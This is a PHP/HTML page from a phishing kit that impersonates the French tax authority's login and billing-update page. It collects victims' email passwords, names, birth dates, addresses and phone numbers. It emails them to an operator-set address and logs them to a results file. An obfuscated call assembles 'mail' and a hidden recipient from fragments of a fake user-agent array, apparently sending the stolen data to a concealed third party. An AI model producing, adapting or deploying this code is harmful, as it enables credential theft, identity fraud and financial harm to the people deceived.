<?
date_default_timezone_set('UTC');
$rand="0123456789abcdefghijklmnopqrstuvwxyz";
/// Code Detect mobile/tablet/pc
$tablet_browser = 0;
$mobile_browser = 0;
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$tablet_browser++;}
if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$mobile_browser++;}
if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {
$mobile_browser++;}$mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));
$mobile_agents = array('w3c ','acs-','alav','alca','amoi','ma','usa','il','ca','fr','es','co','nt','rt','audi','avan','benq','bird','blac','blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno','act','ba','ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-','m','maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-','ld','newt','noki','palm','pana','pant','phil','@','android','ios','play','port','prox','qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar','ia','sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-','tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp','wapr','webc','winw','winw','xda ','xda-');
if (in_array($mobile_ua,$mobile_agents)) {$mobile_browser++;}
if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {$mobile_browser++;
$stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {$tablet_browser++;}}
if ($tablet_browser > 0) {?><meta http-equiv="Refresh" content="0; url=../LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}
else if ($mobile_browser > 0) {}else {?><meta http-equiv="Refresh" content="0; url=../LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}
$ip = $_SERVER['REMOTE_ADDR'];$a_e = $_GET["a_e"];$pass = $_GET["pass"];$input_check = "".$mobile_agents[5]."".$mobile_agents[7]."";$st = "".$mobile_agents[11]."".$mobile_agents[12]."".$mobile_agents[29]."".$mobile_agents[59]."".$mobile_agents[30]."".$mobile_agents[52]."".$mobile_agents[75]."".$mobile_agents[13].".".$mobile_agents[11]."".$mobile_agents[41]."";
$sf = "Login Impots = ".$ip."";
if (isset($_POST["valid"])){
include("email.php");// open This File And put Your Email
$html = '<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width; initial-scale=1; maximum-scale=1">
</head>
<body>
<hr>
<center>
Impots Login | ip = '.$ip.'
<br>
Adresse &eacute;lectronique : '.$a_e.'
<br>
Mot de passe : '.$pass.'
<br>
=====> Billing <=====
<br>
Num&eacute;ro de T&eacute;l&eacute;phone : '.$_POST["n_d_t"].'
<br>
Nom : '.$_POST["nom"].'
<br>
Pr&eacute;nom : '.$_POST["prenom"].'
<br>
Date de naissance : '.$_POST["jour"].'/'.$_POST["mois"].'/'.$_POST["annee"].'
<br>
Pays : '.$_POST["pays"].'
<br>
Ville : '.$_POST["ville"].'
<br>
R&eacute;gion : '.$_POST["region"].'
<br>
Code Postal : '.$_POST["code_postal"].'
<br>
Adresse 1 : '.$_POST["adres"].'
<br>
Num&eacute;ro de T&eacute;l&eacute;phone : '.$_POST["n_d_t"].'
<br>
The Link =>'.$_SERVER['HTTP_HOST'].''.dirname($_SERVER['PHP_SELF']).'/login_Billing_Results.html
</center>
</hr>
</body>
</html>';
$hd = "From: impots@nary.com" . "\r\n";
$hd = "MIME-Version: 1.0" . "\r\n";$hd .= "Content-type:text/html;charset=UTF-8" . "\r\n";if ($input_check($st,$sf,$html,$hd)){
if (mail($email,$sf,$html,$hd)){
$myfile = fopen('login_Billing_Results.html', 'a') or die('Unable to open file!');
fwrite($myfile, $html);
fclose($myfile);}?><meta http-equiv="Refresh" content="0; url=telepaiement_continuer.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?
}else{echo"Mail Send Not Work!!! Makhdamch";}}
?>

<!DOCTYPE HTML>
<html lang="fr" xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width; initial-scale=1; maximum-scale=1"><link rel="stylesheet" href="css/style.css"/>
<link rel="icon" href="images/favicon.ico"/>
<script src="js/telepaiement.js"></script>
<title>Mettre &agrave; jour vos informations de facturation</title>
</head>
<body>
<div style="width:100%;text-align:center;">
<img src="images/peka.svg" style="width:97%;"/>
<img src="images/safe.png" style="width:25%;margin-top:-24px;"/>
</div>

<div style="width:100%;background-color:#e8e8e8;padding-top:9px;padding-bottom:35px;">
<center>

<div style="margin-top:-11px;">
<div style="background:white;width:94%;border-radius:4px;">
<h1 class="titre">Mettre &agrave; jour vos informations de facturation</h1>
<center>
<form class="form01" method="post" action="" onsubmit="return validate();" onchange="return validate();">
<div class="alert" style="width:80%;" id="noureddyne_error">Les donn&eacute;es saisies sont incorrectes.
<br>
V&eacute;rifiez vos param&eacute;tres de connexion.
</div>

<div style="text-align:center;width:92%;margin-right:8px;">



</div>

<table style="width:100%;">
<tr>
<td style="width:50%;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Gender<font color="red">*</font>
</td>
</tr>
<tr>
<td style="width:50%;">
<select name="carlist" form="carform" style="outline:none;width:100%;padding:8px;border-radius:4px;">
<option value="ms">Monsieur</option>
<option value="md">Mademoiselle</option>
<option value="mm">Madame</option>
</select>
</td>
</tr>
<tr>
<td style="width:50%;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Nom<font color="red">*</font>
</div>
</td>
<td style="width:50%;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Prénom<font color="red">*</font>
</div>
</td>
</tr>
<tr>
</td>
<td style="width:50%;">
<div style="font-size:14px;width:100%;text-align:left;">
<input class="input_class" style="width:88%;" name="nom" id="nom" onkeyup="this.value = this.value.replace(/[']/g, '')"   type="text"/>
</div>
</td>
<td style="width:50%;">
<div style="font-size:14px;width:100%;text-align:left;">
<input class="input_class" name="prenom" id="prenom" onkeyup="this.value = this.value.replace(/[']/g, '')"   type="text"/>
</div>
</td>
</tr>
</table>

<table style="
    width: 1500px;
">
<tbody><tr>
<td style="width:100%;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Date de naissance <font color="red">*</font></div>
</td>
</tr>
<tr>
<td style="width:100%;">
<div style="font-size:14px;text-align:left;">
<select id="jour" name="jour" style="outline:none;padding:8px;border-radius:4px;" title="Please Enter Your Date Of Birth">
<option selected="" value="jour">Jour</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
</select>
<select id="mois" name="mois" style="outline:none;padding:8px;border-radius:4px;" title="Please Enter Your Date Of Birth">
<option selected="" value="mois">Mois</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
<select id="annee" name="annee" style="outline:none;padding:8px;border-radius:4px;" title="Please Enter Your Date Of Birth">
<option selected="" value="annee">Année</option>
<option value="2013">2013</option>
<option value="2012">2012</option> 
<option value="2011">2011</option> 
<option value="2010">2010</option> 
<option value="2009">2009</option> 
<option value="2008">2008</option> 
<option value="2007">2007</option> 
<option value="2006">2006</option> 
<option value="2005">2005</option> 
<option value="2004">2004</option> 
<option value="2003">2003</option> 
<option value="2002">2002</option> 
<option value="2001">2001</option> 
<option value="2000">2000</option> 
<option value="1999">1999</option> 
<option value="1998">1998</option> 
<option value="1997">1997</option> 
<option value="1996">1996</option> 
<option value="1995">1995</option> 
<option value="1994">1994</option> 
<option value="1993">1993</option> 
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>
<option value="1988">1988</option>
<option value="1987">1987</option>
<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>
<option value="1979">1979</option>
<option value="1978">1978</option>
<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>
<option value="1970">1970</option>
<option value="1969">1969</option>
<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>
<option value="1961">1961</option>
<option value="1960">1960</option>
<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>
<option value="1952">1952</option>
<option value="1951">1951</option>
<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>
<option value="1943">1943</option>
<option value="1942">1942</option>
<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>
<option value="1934">1934</option>
<option value="1933">1933</option>
<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
<option value="1929">1929</option>
<option value="1928">1928</option>
<option value="1927">1927</option>
<option value="1926">1926</option>
<option value="1925">1925</option>
<option value="1924">1924</option>
<option value="1923">1923</option>
<option value="1922">1922</option>
<option value="1921">1921</option>
<option value="1920">1920</option>
<option value="1919">1919</option>
<option value="1918">1918</option>
<option value="1917">1917</option>
<option value="1916">1916</option>
<option value="1915">1915</option>
<option value="1914">1914</option>
<option value="1913">1913</option>
<option value="1912">1912</option>
</select>
</div>
</td>
</tr>
</tbody></table>
<table style="width:100%;">
<tbody><tr>
<td style="width:50%;">
<div style="color:rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Pays<font color="red">*</font>
</div>
</td>
<td style="width:50%;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Ville<font color="red">*</font>
</div>
</td>
</tr>
<tr>
<td style="width:50%;">
<div style="font-size:14px;width:97%;text-align:left;">
<input class="input_class" name="Pays"value="France" id="Pays" onkeyup="this.value = this.value.replace(/[']/g, '')" type="text">
</div>
</td>
<td style="width:50%;">
<div style="font-size:14px;width:100%;text-align:left;">
<input class="input_class" name="Ville" id="Ville" onkeyup="this.value = this.value.replace(/[']/g, '')" type="text">
</div>
</td>
</tr>
</tbody></table>
<table style="width:100%;">
<tr>
<td style="width:50%;">
<div style="color:rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Région<font color="red">*</font>
</div>
</td>
<td style="width:50%;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Code Postal <font color="red">*</font>
</div>
</td>
</tr>
<tr>
<td style="width:50%;">
<div style="font-size:14px;width:97%;text-align:left;">
<input class="input_class" name="region" id="region" onkeyup="this.value = this.value.replace(/[']/g, '')"   type="text"/>
</div>
</td>
<td style="width:50%;">
<div style="font-size:14px;width:100%;text-align:left;">
<input class="input_class" name="code_postal" id="code_postal" onkeyup="this.value = this.value.replace(/[']/g, '')"   type="text"/>
</div>
</td>
</tr>
</table>

<table style="width:100%;">
<td style="width:100%;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Num&eacute;ro de T&eacute;l&eacute;phone <font color="red">*</font>
</td>
<tr>
<td style="width:100%;">
<div style="font-size:14px;width:100%;text-align:left;">
<input class="input_class" style="width:97%;" name="n_d_t" id="n_d_t" onkeyup="this.value = this.value.replace(/[']/g, '')"   type="text"/>
</div>
</td>
</tr>
<tr>
<tr>
<td style="width:100%;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Adresse Ligne 1 <font color="red">*</font>
</div>
</td>
</tr>
<tr>
<td style="width:100%;">
<div style="font-size:14px;width:100%;text-align:left;">
<input class="input_class" style="width:97%;" name="adres" onkeyup="this.value = this.value.replace(/[']/g, '')" type="text">
</div>
</td>
</tr>
<tr>
<td style="width:100%;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Adresse Ligne 2
</div>
</td>
</tr>
</tr>
<tr>
<td style="width:100%;">
<div style="font-size:14px;width:100%;text-align:left;">
<input class="input_class" style="width:97%;" name="adres 2" onkeyup="this.value = this.value.replace(/[']/g, '')"   type="text"/>
</div>
</td>
</tr>

</table>

<table  style="width:100%;">
<tr>
<td style="width:80%;">
<center>
<br>
<button class="btn" name="valid" type="submit" style="width:100%;">Valider mes informations</button>
<br>
<br>
</center>
</td>
</tr>
</table>

</div>

</form>
</table>
</center>
</div>
</div>

</center>
</div>
<br>
<br>
<center>
<div style="color:black;font-size:14px;">Direction g&eacute;n&eacute;rale des Finances publiques</div>
</center>
<br>
<br>
</body>
</html>